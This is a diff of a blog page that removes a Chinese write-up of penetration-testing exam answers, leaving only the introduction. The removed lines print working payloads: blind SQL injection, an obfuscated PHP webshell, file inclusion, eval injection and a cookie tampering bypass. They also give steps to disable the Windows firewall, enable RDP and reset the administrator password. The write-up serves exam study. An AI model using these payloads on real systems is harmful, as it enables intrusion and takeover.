@@ -262,27 +262,7 @@ class="article article-type-post"
     </header>
     <div class="article-entry post-inner-html">
         
-        <p>12月末参加了PTE考试，题不算难，但考试操作环境垃圾的一瞥，sqlmap不能跑，20道选择，5道基础题，1道综合题，如果不卡壳花4个小时做完也是很有压力。选择题就不说了，主要记录一下大题解法，当然方法不止一种。</p>
-<h1 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a>一、SQL注入</h1><p>sqlmap长时间没更新，跑不起来，只能手注，使用二分法，利用burpsuite慢慢跑，阿西吧。</p>
-<pre><code class="hljs mysql">title=222%27/**/and/**/(if((ascii(substr((select/**/group_concat(password)/**/from/**/users1/**/where/**/username=&#x27;admin&#x27;),1,1))=107),sleep(5),0))/**/and/**/%27abc%27=%27abc&amp;content=/**/</code></pre>
-
-<h1 id="二、文件上传"><a href="#二、文件上传" class="headerlink" title="二、文件上传"></a>二、文件上传</h1><p>搞一个php免杀马直接上传即可。</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$b</span> = substr_replace(<span class="hljs-string">&quot;assexx&quot;</span>,<span class="hljs-string">&quot;rt&quot;</span>,<span class="hljs-number">4</span>);<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$arrayName</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-variable">$b</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pte&#x27;</span>])))<span class="hljs-meta">?&gt;</span></code></pre>
-
-<h1 id="三、文件包含"><a href="#三、文件包含" class="headerlink" title="三、文件包含"></a>三、文件包含</h1><pre><code class="hljs php">php:/php:<span class="hljs-comment">///filter/read=convert.base64-encode/resource=../key3.php</span></code></pre>
-
-<h1 id="四、代码审计"><a href="#四、代码审计" class="headerlink" title="四、代码审计"></a>四、代码审计</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-	error_repoerting(<span class="hljs-number">0</span>);
-	<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;key4.php&quot;</span>;
-	<span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
-	<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$o=strtolower(\&quot;<span class="hljs-subst">$a</span>\&quot;);&quot;</span>);
-	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$o</span>;
-	show_source(<span class="hljs-keyword">__FILE__</span>);</code></pre>
-
-<p>a参数直接传入<code>$&#123;@eval($_POST[1])&#125;</code>，<code>POST 1=cat%20key4.php</code>。</p>
-<h1 id="五、失效的访问控制。"><a href="#五、失效的访问控制。" class="headerlink" title="五、失效的访问控制。"></a>五、失效的访问控制。</h1><p>修改<code>Isadmin=false&amp;username=R3Vlc3Q%3D</code> 为<code>Isadmin=true&amp;username=YWRtaW4%3D</code>即可。</p>
-<h1 id="六、综合题"><a href="#六、综合题" class="headerlink" title="六、综合题"></a>六、综合题</h1><p>综合题是一个图片管理系统，目录扫描发现PhpMyAdmin和后台，PhpMyAdmin弱口令root/root登录，获取key6。发现在数据库images 的 system表中有admin的密码hash，修改为123456的md5hash登录即可。登录后台后传入木马，菜刀连接，翻一翻网站目录发现key7。最后一个key8提示在桌面，那就是要远程连接查看。首先关闭防火墙<code>netsh advfirewall set allprofiles state off</code>，之后利用他的工具库里边的3389端口开启脚本，上传到网站目录下并执行，开启3389端口（上传失败就鼠标拖动到菜刀的网站目录下）。修改administrator的密码<code>net user administrator 123456</code>，mstsc 远程连接，在回收站找到key8。</p>
-
+        <p>12月末参加了PTE考试，题不算难，但考试操作环境垃圾的一瞥，sqlmap不能跑，20道选择，5道基础题，1道综合题，如果不卡壳花4个小时做完也是很有压力。选择题就不说了，主要记录一下大题解法，当然方法不止一种。
         
     </div>
     </div>
